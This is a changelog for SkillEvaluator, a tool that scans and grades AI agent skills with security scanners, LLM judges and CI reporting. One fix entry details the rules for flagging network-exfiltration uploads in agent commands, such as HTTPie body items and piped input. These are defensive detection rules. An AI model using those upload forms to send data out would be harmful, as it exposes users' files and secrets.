# Changelog

All notable changes to SkillEvaluator are documented in this file.

## Unreleased

### Changed

- Name the shared OSS validation policy `default` for both public and private
  repositories. Keep `--profile external`, `--external`, and the legacy
  environment value as compatibility aliases without changing validation rules.
  The CI image now selects `default`; GitHub and GitLab templates explain that
  policy selection does not control report visibility. Existing image pins keep
  their previous label until upgraded to an image containing this change.
  New report policy metadata uses `profile: default` and `audience: all`; its
  digest and bundled source path change with the name. Saved reports are not
  rewritten.

### Documentation

- Keep verified CI templates in the public repository and use one product
  release for Python packages and CI downloads. Update onboarding links to
  avoid relying on separate CI release entries.

### Added

- Private runtime runs retain sanitized loading, coverage, MCP, behavior and
  comparison views before cleanup. The saved snapshot supports offline reports
  in all six existing formats, with explicit missing evidence and omissions.
  Public command activation remains deferred.

- `skillevaluator tier3 feedback RUN_DIR [--skill PATH]` opens a terminal chat
  about one completed Tier 3 run. Answers are grounded in that run's scores,
  with-skill and baseline comparisons, every case's attempts with per-metric
  scores, measured agent tokens and seconds, execution errors, and the report's
  saved feedback, without evaluating again or regenerating LLM feedback. It uses
  the configured `SKILL_EVAL_LLM_PROVIDER` and `SKILL_EVAL_LLM_MODEL`, sends the
  run ID instead of the local path, redacts credential-shaped text, and writes
  nothing to disk. No request is sent before the first question. `LLMClient`
  gains `chat(messages)` for multi-turn requests with the same retries and typed
  errors as `completions()`.

- Opt-in `LLM_JUDGE_FALLBACK_POLICY` and `LLM_JUDGE_RETRY_POLICY` for the Tier 3
  standard judges. `LLM_JUDGE_FALLBACK_POLICY=replace` lets only the judge
  model and the `LLM_JUDGE_FALLBACK_MODELS` entries answer, without the
  built-in `claude-opus-4-8` refusal fallback. `LLM_JUDGE_RETRY_POLICY=strict`
  tries at most three models with two requests each within the judge's time
  budget, moves on only when a model is unavailable, ends the judge on a
  refusal or a quota, budget, safety, or security error, and scores only a
  first reply that is exactly one JSON object. Any other value stops a run
  with standard grading before trials start. The defaults, `append` and
  `legacy`, keep the current behavior.

- Allow hosted CI reports and PR comments from scans called through explicitly
  approved reusable workflow wrappers. Direct callers retain the existing setup;
  signed evaluator identity and exact consumer workflow approvals remain required.

- Include `skillevaluator ci init`, `ci status` and `ci demo` in the Python
  package. Guided GitHub onboarding discovers skills, configures checks and
  optional public hosted reports, and opens a reviewable setup PR. An optional
  test PR demonstrates the results. Existing Pages sites and organization
  action restrictions are preserved; private repositories can use checks only.
- Add a visual CLI onboarding guide under GitHub Actions, alongside the manual
  template path. Keep GitHub and GitLab as the two repository-integration choices.
- Allow CI release templates to pin the reviewed report publisher separately
  from the verified scanner workflow and image.
- `tier3 select-decoys` selects neighboring skills from a local description-
  embedding catalog and saves a reproducible JSON manifest with scores,
  catalog/model identity, and content hashes. Group evaluations can opt in
  with `skill_workspace.decoy_manifest` in `evals/config.yml`; selected content
  is verified and shared between paired arms without selecting again.
  Explicit helper skills and existing workspace defaults remain unchanged.
  Selections exclude skills bundled inside the target and use portable roots
  for the target's collection. Decoy hashes cover the staged runtime content,
  so evaluation configs and other decoy manifests do not invalidate them.
  Output guards protect evaluation inputs and existing non-manifest files.

- In local mode (`--env-mode local`), a missing Claude Code, Codex, or OpenCode
  CLI is offered as a pinned npm install into the SkillEvaluator runtime folder;
  without a terminal, the command is printed instead.

- Support Python 3.14 alongside Python 3.12 and 3.13, including installation
  guidance and CI coverage for tests and built packages.
- Add reusable GitLab CI onboarding and configurable Tier 1 quality thresholds,
  alongside a shared repository integration guide.
- Opt-in `SKILL_EVAL_JUDGE_CHARACTER_FACTS=1` adds bounded, escaped Unicode
  character facts to Tier 3 accuracy, goal-accuracy, and behavior-check prompts
  without normalizing the evidence. The operator setting is verifier-only;
  enabling it selects the prompt-based goal judge instead of the optional RAGAS
  route. Metadata uses the same text rendering as the judge prompts, including
  numeric and nullable fields. Existing prompts remain unchanged when the
  setting is unset.

- `tier3 evaluate` now leads with a case-first summary: a verdict line and one
  row per `evals.json` case. With one agent, each row shows, for with and
  without the skill, the pass count, per-attempt marks (`✓` pass, `✗` fail,
  `⊘` did not run, `·` skipped after a pass) and mean score, plus an effect
  column (`helps`, `hurts`, `both fail`, `better score`, `worse score`,
  `no change`, `inconclusive`). With several agents, each agent gets a column
  showing without-skill → with-skill marks and the pass-rate change. Success
  rate, quality score, and dimensions follow. A "How to improve" list follows,
  ranked by attempts lost and capped at three; each item names the case,
  agent, issue type (`skill`, `skill not used`, `skill hurts`, `environment`,
  `run error`, `eval case`, `missing input`, `goal not met`), one action, and an evidence
  path, and is also written to `what_to_fix.json` in the run directory. When
  nothing needs fixing it prints a one-line "nothing to fix" instead. The
  verdict is `inconclusive` when attempts did not run. The per-evaluator and
  per-dimension tables and metric findings moved behind the new `--verbose`
  flag and remain in `report.html`.
- `goal not met` flags with-skill attempts that pass on the aggregate score
  while the judge scored goal accuracy 0.00 (for example, the agent only asked
  for details).
- `report.html` leads with the same case-based findings: "Verdict at a glance"
  adds the per-case result, the highest-scoring agent versus the biggest skill
  lift, and the goal-not-met count; "Conclusion & Next Steps" and the Insights
  recommendations list the `what_to_fix.json` fixes (or "Nothing to fix").
  Data fixes elsewhere: Pass@K shows attempts passed, a regressed passing
  dimension reads "PASS · regressed" with its weakest signal, resource totals
  are formatted with units and percent change, Attempt Details groups each
  case's with/without rows and marks passes that missed the goal, and Error
  Recovery lists only trials with faults, retries or warnings.
- Reusable GitHub Actions onboarding for complete Tier 1 checks, with
  pinned runtime/workflow consumer templates, affected-skill PR selection,
  optional hosted reports and updated PR feedback. The new guide separates
  basic scanning from publisher setup; public image publication and generated
  release files require a reviewed manual release before consumer use. The
  Tier 1 image is a multi-stage build with precompiled bytecode that ships only
  the locked Semgrep, SkillSpector and SkillEvaluator environments, Gitleaks,
  `ci/` and the license files. A release builds it without cached layers and
  pushes the image it smoke-tested.
- The reusable Tier 1 workflow scans up to four skills at once. The
  `scan-workers` input (1 to 16) changes this, and `1` scans one skill at a
  time. Each worker gets its own private home and temporary directory. Logs,
  annotations and report rows keep skill order, and skills not started when the
  scan time budget runs out are still reported as not evaluated. A timeout,
  Ctrl-C or an error while saving results ends running scans together with
  the scanner tools they started.
- `--quality-config PATH` on `validate`, `quality-check`, and `tier1` loads the
  deterministic quality check's expected Markdown headings from a YAML file
  instead of the built-in list. Each `expected_headers` entry sets a `heading`
  and optional `alternatives`, `points` (default 5), `message`, and
  `suggestion`; omitted message and suggestion text is generated from the
  headings. Without the flag, the packaged `quality-default.yaml` reproduces
  the previous Prerequisites, Limitations, and Troubleshooting checks and
  wording, so default scores are unchanged. An invalid file (bad YAML or
  unparseable values, unknown keys, duplicate keys or headings, non-heading
  values) is rejected before validation starts with exit code 2 and a message
  naming the file and field, even when `--checks` leaves out `quality`. The JSON report, Markdown report,
  and BENCHMARK.md record which config produced the quality score as
  `quality_config` (`packaged` or `custom`, the custom file's name, a
  `sha256:` digest of the normalized rules, and the `--min-score` pass
  threshold, which is kept out of the digest).
- CI-native per-skill HTML pages link Download JSON to the retained
  `skillevaluator-tier1.json` and do not embed a second copy of the report
  JSON. Standalone CLI HTML reports embed it for Export JSON.
- Rubric evaluation JSON reports name the provider and model that gave each
  score as `llm_provider` and `llm_model_used` in the skill's `rubric_eval`
  success detail and, for a single skill, also in `rubric_eval`. Tier 3
  conclusions and recommendations written by the LLM, and LLM-written
  dimensions returned by `compute_dimensions`, record the model that wrote
  them as `model`. For a Claude 5.5 or later model on the native Claude API
  this is the model the reply names: the server-side refusal fallback model,
  not the configured model, when the fallback answered. Otherwise it is the
  configured model, unless a server-side `fallback` block in the reply names
  another model.

- Tier 3 runs can be limited to the first N eval cases with the opt-in
  `--max-cases N` flag on `validate`, `tier3`, and `tier3 evaluate`, or the
  `harbor.max_cases` key in `evals/config.yml`; the CLI value wins. Unset, every
  case runs as before. Cases are taken in staged order (dataset order, or
  task-directory name order for native Harbor tasks) and the same subset runs
  for every agent's with-skill and baseline arms. The dataset snapshot and
  expected-case checks cover only the cases that ran, `run_config.json` records
  the selection as `case_selection`, and a run that skipped cases is reported
  as publication-incomplete in JSON, HTML, and BENCHMARK.md.
- Tier 1 schema validation accepts a list for `metadata.domain` in `SKILL.md`
  (for example `domain: [backend, ai-ml]`) instead of reporting a HIGH
  `Input should be a valid string` finding that also stopped the remaining
  schema checks for that skill. A single string is still accepted and is
  treated as a one-entry list. The parsed value is now always a list: entries
  are trimmed and deduplicated in order, and a missing, null, or blank value
  becomes an empty list. Lists longer than 16 entries and non-string, blank, or
  over-128-character entries are rejected. This adds a length limit that
  `metadata.domain` did not have before: a single string longer than 128
  characters, which used to pass, now fails Tier 1 with a HIGH
  `Field 'metadata.domain'` finding.
- `doctor` and `health-check` take `--tier 1|2|3|all`, so Tier 1 and Tier 2
  readiness can be checked before a run instead of surfacing mid-validation.
  Tier 1 reports each scanner that the `--checks` selection runs: SkillSpector,
  Bandit, Semgrep, Gitleaks, and pip-audit for `dependency`. Each row shows the
  resolved path, any executable override, and the version from a bounded,
  shell-free probe. A scanner fails when it is missing, its override is
  malformed, its probe fails or exceeds `--timeout` (default 60 seconds, at
  most 3600), or it is older than Bandit 1.9.4 or Gitleaks 8. Tier 2 resolves
  the embedding and LLM providers offline. `doctor --tier 2 --verify-models`
  also sends one embedding request and one chat request, each bounded by
  `--timeout` and sent without retries, and reports only the HTTP status and a
  remedy. `--tier all` checks every tier, and a failed tier does not stop the
  next. Without `--tier`, both commands still check Tier 3 only. An option for
  an unselected tier, or `--timeout` for an offline Tier 2 check, is a usage
  error. `tier3 doctor` remains Tier 3-only.

- Tier 1 `--llm` security scans of a single skill keep the LLM provenance that
  SkillSpector v2.12.0 and later report: the provider adapter, the model and
  SkillSpector revision behind each LLM analyzer, and the sampling and
  determinism evidence. The Security result in the JSON report carries it as
  `skillspector_llm_provenance`, next to `skillspector_provider_id`, the
  SkillEvaluator provider the scan was bridged from (for example `nv_build`,
  which SkillSpector runs as its `openai` adapter). The HTML report, including
  CI pages rendered from the retained Tier 1 JSON, lists it in a collapsible
  Tier 1 LLM Provenance table. The record is also kept when the LLM stage
  fails or SkillSpector does not confirm LLM analysis, as long as
  SkillSpector's JSON output carries a valid record, so the report shows what
  was attempted. Records that do not match SkillSpector's provenance contract or
  that contain endpoint- or credential-shaped values are left out, and older
  SkillSpector releases produce no record.
- `--skip-with-skill` on `tier3 evaluate` and the direct `tier3` workflow runs
  only the without-skill baseline arm, for example to calibrate a task set or
  re-measure a baseline after a model change without paying for with-skill
  trials. Only baseline tasks are staged and launched. The run is reported as
  a baseline calibration: `mode` is `baseline_only`, the overall score and best
  agent come from the baseline arm, the with-skill arm is recorded as
  `skipped`, with-skill scores and lift stay unavailable instead of becoming
  0.0 (report tables print `skipped`), and the verdict stays NEUTRAL. The flag
  is mutually exclusive with `--skip-baseline`, keeps the baseline isolation
  rules, and is not accepted by `validate`, so a baseline-only run cannot pass
  a Tier 3 gate.

- The Tier 3 verifier saves every LLM judge attempt to `judge_attempts.json`
  next to the trial's `skill_evaluator_reward.json`, rewritten after each
  attempt so it also explains a judge that failed. Each entry records the
  metric, attempt number, method (`llm`, `ragas` or `salvage`), judge model,
  status, and the problem with a rejected reply, plus the prompt and reply
  with long text shortened. A `behavior_check` score rebuilt from a truncated
  reply adds a `salvage` entry. Configured credentials, common key shapes,
  URL userinfo, `Authorization`, API-key, token and `Cookie` header values,
  and the values of credential flags such as `--token` and
  `curl -u user:password` are masked. Rewards record
  `judge_contract: skill-evaluator-judges-v2`, a reserved name that custom
  graders cannot use.

- Tier 1 sets up SkillSpector 2.13.3 and Gitleaks 8.30.0 on first use from
  pinned, SHA-256-verified releases, without a prompt; Semgrep is optional
  unless `SKILLEVALUATOR_REQUIRE_SEMGREP=1`. `--skip <check>` on `validate` and
  `tier1` leaves a check out and reports it as skipped. A `scanners` row and the
  JSON report record which scanner versions ran.

- `--pii-waivers PATH` on `validate`, `tier1`, and `pii-scan` accepts a
  reviewed PII value without relaxing the whole check through a severity
  override. Each waiver names the PII check, the file (relative to the waiver
  file's directory), the line, the SHA-256 digest that PII findings now report
  as `evidence_sha256`, a reason, an owner, and a `created`/`expires` window
  of at most 366 days, and it stops applying as soon as any of them no longer
  matches. Other values on the same line are still reported. Reports list each
  waiver for a scanned file as applied (INFO), stale (LOW), or expired
  (MEDIUM), so one file can serve single-skill, folder, and catalog runs. A
  malformed file is rejected with exit code 2; through the Python API it
  applies no waivers and fails the PII scan with a HIGH
  `invalid-pii-waiver-file` finding. Credential checks cannot be waived, and
  their findings, like any finding whose value reports mask, carry no digest.
  Waivers are never discovered automatically inside the scanned skill; pass
  the file with `--pii-waivers`.
- Every finding now has stable IDs for tracking across runs and validators.
  `finding_id` (`SEF-…`) is derived from the finding's category, check,
  message, and suggestion, so it survives line moves, whitespace or case
  changes, and severity overrides. Location text a check copies into its
  message is left out of it: the `in <file>:<line>` in a secret detection
  message, also in a folder or plugin run that prefixes the file path, and
  the `— N occurrences (…)` list a PII scan message ends with. A file name in
  a message or suggestion, as script lint and secret detection write, stays
  part of the ID. `occurrence_id` (`SEO-…`) adds the file, line, and line
  content. Otherwise identical findings in different files or skills
  share one `finding_id`, so they count as one unique finding with one
  occurrence per location. When CI redacts a detected credential from a
  report, it recomputes the IDs from the redacted text and renders the HTML,
  Markdown, and SARIF copies from that JSON, so no ID is derived from a
  removed value. The JSON report and the HTML report's embedded data
  add `finding_counts` (raw records, distinct occurrences, unique findings,
  and duplicates removed), `finding_groups` (each unique finding with its
  validators and every location, including each location a PII finding
  lists for a repeated value, also in a folder run), and `message_counts`
  (error and warning strings with no finding behind them, such as failed
  gates and scanner or execution errors, but not the workflow scope note for
  a stage that configuration skips, plus informational messages other than
  the `[OK]` line recorded for each passed check); each JSON result also
  carries its own `finding_counts`. Markdown adds a Finding Reconciliation
  table, most severe first, and per-finding IDs. `total_errors`,
  `total_warnings`, and `severity_counts` are unchanged.

- `--skillspector-baseline FILE` on `validate`, `tier1`, and `security-scan`
  applies an audited SkillSpector suppression baseline, so reviewed false
  positives no longer leave the security check failed or `INCOMPLETE`.
  Baselines apply only when passed explicitly; one shipped inside the skill is
  never used, and suppressed findings without a requested baseline still fail
  closed. A rule without a literal run in its `id` (two characters)
  or in its `path` or `message` (four), such as `id: "*"` or `message: "*e*"`, or a version 2 rule or fingerprint without a `reason`, is
  rejected before the scan, as are entries that are not mappings, unparseable
  files, and files beyond SkillSpector's size and YAML expansion limits; an
  empty file is an empty baseline. A baseline kept inside the skill is
  excluded from the scan, including the staged copy used when the skill has
  `evals/` outputs. JSON reports add `results[].skillspector_baseline` with the
  outcome (`applied`, `no_matches`, `fingerprint_version_mismatch`,
  `llm_stage_unmatched`, or `not_applied`), the baseline file name and
  `sha256:` digest (never its local path), scanner versions, and per-stage
  finding counts with the suppressed findings' severities and rule IDs, and Markdown and HTML reports show the outcome as a
  `skillspector_baseline` line. Fingerprints ignored after a SkillSpector
  upgrade, or not matched by the LLM stage, are reported instead of silently
  suppressing nothing; fingerprints only match static-only runs.

- Tier 3 **Measured Agent Resources** split each trial's trajectory time into
  LLM seconds and tool seconds, plus LLM milliseconds per prompt + completion
  token, with with-skill-minus-baseline deltas in the HTML report and the
  `resources` JSON object. Native ATIF timing is used when present; otherwise
  the time is inferred from step timestamps and the `Wall time` header of Codex
  shell and `apply_patch` output, so the default Codex agent on Harbor 0.24
  gets real values. Each trial records its timing source, and a comparison that
  mixes native and inferred timing carries a `mixed_timing_sources` caveat.
  Trials with unmeasured tool calls (for example `update_plan`, web search or
  MCP tools) stay `N/A`, and the time between multi-step Harbor steps is not
  counted. Deltas keep the existing complete-arm and matching-case rules;
  scores, verdicts and gates do not change.
- `scripts/ci/check_public_benchmarks.py` accepts `--expected-source-repository`,
  `--expected-source-revision` and `--expected-evaluator-container-revision`,
  so a publishing pipeline can check that each card names the source it asked
  to evaluate. A card of any verdict fails when the matching `Evaluated source`,
  `Evaluated source revision` or `Evaluator container revision` line is
  missing, `not recorded`, malformed, duplicated or different. Values are
  compared in the canonical form the card records, and any of these options
  implies `--require-files`. Without them the scan is unchanged.

### Changed

- Shared LLM calls and the Harbor verifier retry HTTP 408, 429, and every 5xx
  response except 501 and 505, including proxy 520–524 and overload 529 errors.
  TLS certificate verification failures stop immediately. The host Bedrock
  path preserves the underlying status and certificate failure through
  LiteLLM wrappers, so generic 500/503 errors do not cause extra attempts.
  This applies to ordinary skill evaluations and other host LLM calls as well
  as plugin evaluations; retry limits and scoring formulas are unchanged.
- The compact `validate` view lists every Tier 3 test case with and without
  the skill, updates the list while trials run, and ends each tier with a short
  "what to fix" list: the problem, then the action. A required scanner that
  could not run counts as "didn't run", not as a failed check.

- Hosted GitHub reports verify a separate GitHub-signed execution receipt.
  Enable `id-token: write` in the scan workflow and refresh its approved blob
  when adding hosting; ordinary scans keep their existing read-only permissions.
- Link GitHub and GitLab source templates directly from the README and onboarding
  guides. Keep report, log and PR comment examples in the public repository,
  removing onboarding dependencies on personal demo links.
- GitHub onboarding shows the PR comment example directly on the page and
  explains the two templates and required one-time publisher setup.
- HTML reports use a verdict-led layout with a sidebar and expandable check
  details. The verdict replaces the pass percentage; checks marked Not
  applicable are excluded from passed and executed counts. Publication status
  remains visible on mobile and in print, and blocking/advisory findings retain
  their separate counts.
- The HTML report opens on the answer. The skill name is the page title, and
  the header shows one verdict, the date and version, and Download JSON. A
  summary gives the verdict with a one-line reason, four numbers with one
  definition of a finding, and a Fix first list of up to five places, most
  severe first and linked to their evidence. A scanner that did not finish is
  listed first with its own reason, and two scanners reporting one location
  take one entry. Scanner diagnostics always show and print.
  Failed checks are listed first, raw check IDs get plain names, and
  publication eligibility sits next to the verdict.
- The HTML report, the CI index and the Pages history use one verdict
  vocabulary: Passed, Changes required, Incomplete, Skipped and Neutral. When
  no check ran, the header and the summary both say Skipped. A failing tier
  whose gate does not block shows Failed (advisory). The CI index names the
  same first fix as each skill's report and links to it.
- The SkillEvaluator logo replaces the letter tile and the green square on
  every report page, the CI index and the Pages history. Colors use one
  palette built on the logo greens, with WCAG AA text contrast in light and
  dark themes. The report follows the system theme until the reader picks
  one, and prints dark text on white paper, Tier 3 charts included. No text is
  smaller than 11 px, and short table cells no longer break mid-word.
- Dependency audits inspect pinned package versions without installing packages
  or executing build scripts. Unpinned, URL and other unresolved requirements
  report incomplete coverage instead of executing package resolution.
- The CLI reference now compares the direct `tier1`, `tier2`, and `tier3`
  workflows with `validate --tiers`: which tiers run, Tier 1 dependency and LLM
  stages, report files, and exit codes. It also states that `--tiers` must
  include Tier 1, so Tier 2 or Tier 3 alone runs through its direct workflow.
- Install instructions, the CI recipe, the missing-scanner hint and the Tier 1
  CI image's scanner lock now pin SkillSpector to `v2.13.3` instead of
  `v2.12.0`. With `v2.12.0`, the Tier 1 security check could be `INCOMPLETE`
  or fail for skills with no real issue: valid Python and Perl helpers were
  recorded as only partially inspected
  (`static_parse_limit` or `obfuscated_instruction_text`,
  [NVIDIA/SkillSpector#777](https://github.com/NVIDIA/SkillSpector/pull/777)),
  the bytecode check could hit its time budget while waiting behind other
  analyzers (`runtime_limit`,
  [NVIDIA/SkillSpector#828](https://github.com/NVIDIA/SkillSpector/pull/828)),
  and visible text between HTML comments raised High P2 hidden-instruction
  findings
  ([NVIDIA/SkillSpector#452](https://github.com/NVIDIA/SkillSpector/pull/452)).
  An existing SkillSpector install keeps its version until you rerun the
  install command. `v2.13.3` still does not return structured output for
  Claude 5.5 models, so set `SKILLSPECTOR_MODEL` as before when
  `SKILL_EVAL_LLM_MODEL` names one.
- README and onboarding docs now offer two first-run paths: a lightweight,
  keyless quality check on a bundled skill, or an NVIDIA Build rubric evaluation
  with eligible free prototyping access. Installation adds extras as needed,
  and the guides separate quality results from full scanner and live-agent
  evidence.
- The optional GitHub report publisher downloads only a small
  `skill-evaluator-tier1-evidence-attempt-N` artifact holding `summary.json`
  and each skill's JSON. At 99 skills the download drops from 4.2 MB to
  0.46 MB, and HTML, SARIF and logs no longer count toward its 64 MiB limit.
  A scan from an evaluator revision that does not upload this artifact cannot
  be published. Re-running it reuses that evaluator, so update the scan caller
  and the publisher allowlists, then start a new scan. When an automatic run
  commits nothing new, the publisher skips its Pages deploy and PR comment and
  leaves both to the run that pushed that content. The publisher also installs
  uv into a private environment instead of the runner's system Python, checks
  out only the tool files each job needs and replaces site files atomically.
  It and the PR comment helper share one GitHub client, which rejects sibling
  repository endpoints and NaN or Infinity in JSON for both.
- HTML reports rendered in one process share one compiled template
  environment, so each template compiles once per process instead of once per
  report.

- The Markdown summary and the HTML report's summary now count findings the
  same way: each unique finding once, at its highest severity, however many
  lines, files, skills or validators report it. Markdown's Total Issues adds
  distinct occurrences, raw records, and errors and warnings with no finding
  behind them, such as failed gates and incomplete scans; its severity
  breakdown counts unique findings. In HTML, the tier cards, the Tier 1
  Findings and Blocking critical + high numbers, the verdict sentence, the
  skill finding badges and the gate policy line count unique findings, and
  the Findings number shows the same occurrence, raw-record and no-finding
  counts beneath it when they differ from the unique count. Both formats used
  to add up raw records, so a finding reported on several lines or by two
  validators counted more than once. The HTML report's embedded and exported
  data changes `summary.total_issues` the same way: it now counts unique
  findings plus errors and warnings with no finding behind them, instead of
  raw errors plus warnings; the raw finding count is in
  `summary.raw_finding_occurrences` and `finding_counts.raw_occurrences`. The
  JSON `skills[].issue_count`, contributor totals, `total_errors`,
  `total_warnings` and `severity_counts` still count raw records.

- The Tier 3 per-evaluator drill-down and steps chart now include baseline
  (without-skill) trials. The drill-down adds a Condition column and shows
  metrics that only baseline rows scored; the steps chart plots one series per
  agent and condition from every trial, for up to 200 eval cases. Cases with
  missing or partial step telemetry stay gaps instead of zeros or partial
  averages. The token chart remains with-skill only; Measured Agent Resources
  compares token totals across both arms.

- Tier 3 `accuracy` grades the outcome only. The `SKILL_IDENTIFIED` criterion,
  which capped a correct answer from the no-skill baseline at 0.8 on positive
  cases, is replaced by `FORMAT_FOLLOWED`: the response follows any output
  format the question explicitly requires, and when none is required it is
  true only if the response gives an answer. A trial that ran but gave no
  answer still scores `0.0`, as before. Skill use is still scored by
  `skill_execution`. Every case and both arms use the same five criteria, so
  rewards no longer record `excluded_criteria` or the
  `applicable-accuracy-criteria/v1` policy; reports still read older rewards
  that do. `judge_accuracy` still accepts the `skill_identification_applicable`
  keyword but ignores it. Expect baseline accuracy to rise and accuracy lift to
  fall for the same runs.

- Tier 3 LLM judges return verdicts only, and the verifier computes every
  score: `accuracy` is passing criteria divided by five, `goal_accuracy` is
  `1.0` when the goal was achieved and `0.0` otherwise, and `behavior_check` is
  the share of expected behaviors observed. A `score` field in a reply is
  ignored, and the prompts no longer ask for one. An invalid reply is retried
  once with the exact problem, for example `steps not judged: [2]`, instead of
  a generic format reminder. The prompt examples are valid replies for the task
  at hand, and the goal prompt no longer shows an empty tool-call section.

### Documentation

- Give the performance dashboard its own sidebar guide, retain the previous
  Reports & Results link, and explain matching-judge and activation limits on
  comparisons. Clarify the independent per-skill quality threshold, Windows
  Docker setup, and custom-backend and MCP environment controls.

### Fixed

- Read JSON, JSONL and YAML evaluation datasets as UTF-8 so Unicode prompts and
  answers load correctly on hosts with a non-UTF-8 default text encoding.

- Tier 3 behavior-check evidence bundles now count a final answer cut by
  the final-response section limit as truncated. The omission check
  compared two renderings that both capped that section (800 characters
  by default), so a long final answer could lose its middle to the cap
  while the bundle claimed `truncated: false`. The comparison now runs
  against a rendering without the final-response section limit. An answer
  that still reaches the judge in full is not flagged, including one split
  between the compact history and the end of the final-response section.
  The `reason` names each setting that cut evidence:
  `SKILL_EVAL_BEHAVIOR_CHECK_BUDGET`, `SKILL_EVAL_BEHAVIOR_FINAL_RESPONSE_LIMIT`,
  or both. Caps inside individual sections (write bodies, history summaries)
  are unchanged. The evidence-budget documentation now names both causes of
  a `behavior_check` truncation and which setting raises each.

- Tier 3 security grading no longer reports a network-exfiltration warning,
  which lowered the Security score to 0.5, for HTTP method prose such as
  `Use HTTP POST to create an item.` or `Document HTTP PUT semantics.` in a
  here-document or `apply_patch` body. Linux finds a command by its exact name,
  so a later bare `HTTP`, `HTTPS`, or `Http` word does not start HTTPie, and
  its method word is no longer read as an upload. Its body items, piped or
  redirected input, `--raw`, and a method word before a `name:@file` header
  item, even a quoted or escaped one, or before a `$VAR` word still warn, as do
  a lowercase `http PUT URL`, a path or `.exe` word such as `./HTTP POST URL`
  or `HTTP.exe POST URL`, an `HTTP POST URL` command word, and any upload in
  the same action. Both the host checker and the bundled Harbor verifier apply
  the rule.

- PR scan comments show the verdict, quality scores, first actionable fixes and
  report links; full provenance and detailed findings stay in the report.
- Hosted reports use the retained site commit as the Pages deployment identity,
  so repeated publications from one default-branch revision deploy fresh reports.

- Reusable Tier 1 CI always requires Semgrep in scanner subprocesses, so local
  optional-scanner defaults cannot hide missing CI code-scanning coverage.

- Use public, commit-pinned README image URLs so the wordmark and three-tier
  diagram can render in PyPI package descriptions as well as on GitHub.
- On Windows, repository root and source-link detection no longer break for
  repositories in non-ASCII folders. Git's repository path is decoded as a file
  name and its remote URL and branch as UTF-8, instead of with the locale code
  page.
- CI quality thresholds apply to every parallel scan worker. Report overviews
  and detailed reports surface failed quality gates ahead of advisory findings,
  with links to the check that needs attention.
- When `validate` finds an unusable Tier 3 source, the terminal and HTML
  report now say which entries or files failed and why, instead of only
  "Create or fix the Tier 3 source ... and rerun validation." The terminal
  lists the errors under the Tier 3 finding when the full CLI report prints
  (`-r cli` or `--verbose`) and otherwise in the compact Tier 3 panel. When
  the run also writes an HTML or JSON report, the terminal shows the first
  five and names that report for the rest; when it writes neither (for example
  `-r cli` alone, or `--verbose` without `-r`), the terminal lists every
  error. The HTML dashboard shows a single error in full or the error count,
  and Full Insights lists every error under Source Validation Errors. The
  errors come from the skill's eval files, so they are printed as plain text
  with terminal control sequences removed. Passing checks and warnings are not
  listed. The JSON report still carries every error under
  `tier3.provenance.source_validation`. Validation rules, gate decisions, and
  the finding's suggestion text are unchanged.
- Tier 3 Docker and Kata runs retry a Claude Code or Codex install that fails,
  for example on a dropped download or a package mirror error, instead of
  failing the trial on the first attempt. Up to three attempts run within
  Harbor's agent setup timeout, so an install that keeps failing still fails
  the trial. A slow failure that would leave no room for another attempt is
  not retried, so the trial reports the install error rather than a setup
  timeout, and each retry warning ends with the failed command's output.
  Platform probe and transport errors are not retried, and local mode still
  checks the installed CLI once.
- Tier 3 `--stop-on-pass` (or `harbor.stop_on_pass: true`) no longer ignores
  `--n-concurrent`. Every case and attempt previously ran one at a time, so
  large evaluations took several times longer than the configured concurrency
  allowed. Up to `n_concurrent` cases now run at once per agent. A case's
  attempts still run one after another and stop after its first pass, the
  with-skill and without-skill arms still run one after the other, and the
  merged arm results keep dataset order.
- Tier 2 caps every intra-skill embedding chunk at 3,000 characters, preserves
  meaningful short tails and actual Python docstring source ranges, and avoids
  counting pieces of one original chunk as duplicates of each other. Oversized
  Markdown sections are packed by paragraph, so short labels and fragments stay
  attached to their neighbours, source ranges retain blank-line gaps, and findings
  list a split source once.
- A chat model that declines to classify a Tier 2 content cluster (a safety
  refusal, which some models return for security-themed skill content) no
  longer marks the scan incomplete and fails `validate` under the default
  `--block-on-dedup`. Tier 2 now reports the refusal as an advisory MEDIUM
  `llm_refused` finding that names the overlapping sections, and the JSON
  report's `llm_analysis` counts it in `clusters_refused`. Other chat-LLM
  failures still leave the scan incomplete. Raise `CONTENT_DEDUP.llm_refused`
  in a policy overlay to keep refusals blocking.
- Tier 2 context deduplication no longer stops valid skills at the
  `scalar_comparison_limit` work limit below its 512-chunk ceiling. The fixed
  25,000,000 scalar-comparison budget stopped 2,048-dimensional embeddings at
  156 chunks and 1,536-dimensional embeddings at 180. The budget is now
  267,911,168, so embeddings of up to 2,048 dimensions reach all 512 chunks.
  Wider embeddings have a lower effective chunk limit (418 chunks at 3,072
  dimensions, 362 at 4,096), which the incomplete-scan error and the JSON
  `work_limit` record now report as `effective_chunk_limit`, next to the
  skill's own `chunk_count`.
- Tier 2 context deduplication no longer stops skills with many repeated
  sections at the `llm_cluster_member_limit` work limit. A candidate cluster
  with more than 64 members was reported as incomplete even when its review
  prompt fit the 64,000-character budget. The member limit now equals the
  512-chunk ceiling, which the chunk check already enforces, so it is only a
  guard and never stops a scan on its own; the per-cluster prompt, total
  prompt, and cluster-count limits decide. When a cluster's request (system
  prompt plus cluster text) would exceed 64,000 characters, each exactly
  repeated text is sent once as `SHARED CONTENT n` when that makes the request
  shorter; a short text repeated under long headings stays inline. A Markdown
  section is compared without its own heading line, so the same body under
  different headings is shared too. Every occurrence keeps its own entry with
  its file, section, line range, and heading line. Distinct text is never
  dropped or sampled, so a cluster still over the budget stays incomplete with
  `llm_prompt_size_limit`. Duplicate and `llm_refused` finding messages name
  at most 64 member locations and source files and count the rest; the JSON
  `source_files` list stays complete.
- Local-mode verifier uploads now copy directly to the absent destination,
  avoiding an unnecessary rollback snapshot of an empty tests directory.
  Inputs and rewritten scripts are prepared privately before publication,
  so failed uploads preserve existing verifier files. Missing or invalid
  sources fail rather than creating an empty verifier directory. Per-step
  verifier uploads retain shared test files, with step files taking precedence.
  After any command runs, the next upload replaces the tests directory, so
  files or links the agent left there cannot change verification.
- Harbor's standalone verifier now runs on Python 3.9 task images after sharing
  deterministic checks with the host evaluator, and honours HTTP-date
  `Retry-After` headers there. CI scores a sample trajectory with the packaged
  verifier on a real Python 3.9 interpreter to retain this compatibility.
- With `--stop-on-pass`, a retained Harbor agent timeout followed by a matching
  completed attempt no longer invalidates the scored result. Timeout rewards
  remain excluded, failure history is retained, and the JSON summaries
  distinguish scored, recovered, and intentionally skipped attempts. Recovered
  timeouts are reported under `recovered_trial_failures` and
  `historical_job_failures` instead of as active failures. Other execution failures and
  incomplete comparisons still fail validation.
